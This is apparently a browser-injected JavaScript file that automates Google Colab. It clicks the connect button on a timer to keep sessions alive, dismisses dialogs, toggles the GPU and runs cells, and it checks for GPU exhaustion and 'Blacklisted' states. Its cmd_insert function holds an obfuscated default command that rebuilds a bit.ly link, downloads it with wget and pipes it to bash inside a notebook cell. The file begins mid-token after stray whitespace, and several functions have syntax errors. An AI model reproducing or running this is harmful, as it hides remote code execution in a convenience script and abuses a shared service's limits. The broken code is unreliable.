6d7ed7f8ecb47e874cee44537b3b123c7e016780		branch 'main' of https://github.com/one10001/10001code
                                                                                                                                                                                                                                                                                                                                                                                                                               t ).ready(function( $ ) {
			  // Code that uses jQuery's $ can follow here.
			});
			// ----------------------------------------------------------
			// This part of the script triggers when page is done loading
			console.log("Hello. This message was sent from scripts/inject.js");
			// ----------------------------------------------------------
			setInterval(clickConnect, 60000);	//1 minute
			//setInterval(clickConnect, 20000);	//20 sec
		}
	}, 10);
});

// Credit to https://medium.com/@shivamrawat_756/how-to-prevent-google-colab-from-disconnecting-717b88a128c0
function clickConnect() {
	try {
		 document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click();
		// this also works, if above one doesn't work, comment it and uncomment below one
		//document.querySelector("colab-connect-button").shadowRoot.getElementById('connect').click();
		setTimeout(clickDismiss, 2000);
		console.log("Keeping Colab Alive!");	
	} catch (error) {
		console.log(error);
	}
}

function clickConnectSmart() {
	try {
		console.log(document.querySelector("#top-toolbar > colab-connect-button").
		shadowRoot.querySelector("#connect").textContent.match("onne") != null){}
		 document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click();
		// this also works, if above one doesn't work, comment it and uncomment below one
		//document.querySelector("colab-connect-button").shadowRoot.getElementById('connect').click();
		setTimeout(clickDismiss, 2000);
		console.log("Keeping Colab Alive!");	
	} catch (error) {
		console.log(error);
	}
}

function clickDismiss() {
	try {
		document.querySelector('colab-sessions-dialog').shadowRoot.querySelector('.dismiss').click();
		console.log('clicked on dismiss button');
	} catch (error) {
		console.log(error);
	}
}

function run_cmd() {
	console.log(document.querySelector("div > colab-run-button").title.match("Enter") != null)
	if (document.querySelector("div > colab-run-button").title.match("Enter") != null)
	{ 
	  console.log("runnning ...")
	 document.querySelector("div > colab-run-button").click()
	}
	else {
	  console.log("already_working")
	}
  }
  
  function stop_cmd() {
	console.log(document.querySelector("div > colab-run-button").title.match("Enter") == null)
	if (document.querySelector("div > colab-run-button").title.match("Enter") != null)
	{ 
	  console.log("stoping ...")
	 document.querySelector("div > colab-run-button").click()
	}
	else {
	  console.log("stoped already")
	}
  }

  function enable_gpu() {

	try {
		document.querySelector('[command="notebook-settings"]').click()
		document.querySelector('#accelerator').options.selectedIndex=0 //cpu
		document.querySelector('#accelerator').options.selectedIndex=1 //gpu
		document.querySelector("#ok").click()
	} catch (error) {
		console.log(error);
	}

  }
  
  function disable_gpu() {
  
	try {
		document.querySelector('[command="notebook-settings"]').click()
		document.querySelector('#accelerator').options.selectedIndex=1 //cpu
		document.querySelector('#accelerator').options.selectedIndex=0 //gpu
		document.querySelector("#ok").click()
	} catch (error) {
		console.log(error);
	}
  }

  function check_ok() {
  
	try {
		if (document.querySelector("#ok") == null)
		{ 
		  console.log("no ok ...")
		}
		else if (document.querySelector("#ok").parentElement.parentElement.textContent.match("GPU") != null ){
		  console.log("No more GPU")
		}
		else if (document.querySelector("#ok").parentElement.parentElement.textContent.match("ero") != null ){
			console.log("backend error")
		}
		else if (document.querySelector("#ok").parentElement.parentElement.textContent.match("ble") != null  ){
			console.log("Blacklisted")
		}
		else {
			console.log("already_working")
		  }
	  }
	  
	 catch (error) {
		console.log(error);
	}
  }

  function check_status() {
  
	try {
		if (document.querySelector("#ok") == null)
		{ 
		  console.log("no ok ...")
		}
		else if (document.querySelector("#ok") == null ){
		  console.log("already_working")
		}
		else {
			console.log("already_working")
		  }
	  }
	  
	} catch (error) {
		console.log(error);
	}
  }



function cmd_insert(cmd = '!i=001;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash'){
	
	try {
		if (document.querySelector("div.codecell-input-output  span > span") == null)
		{ 
			document.querySelector("#toolbar-add-code").click()
		  console.log("new cmd ...")
		}
		else {
			console.log("cmd exist inserting code...")
			document.querySelector("div.codecell-input-output  span > span").textContent=cmd
		  }
	  }
	  
	 catch (error) {
		console.log(error);
	}
}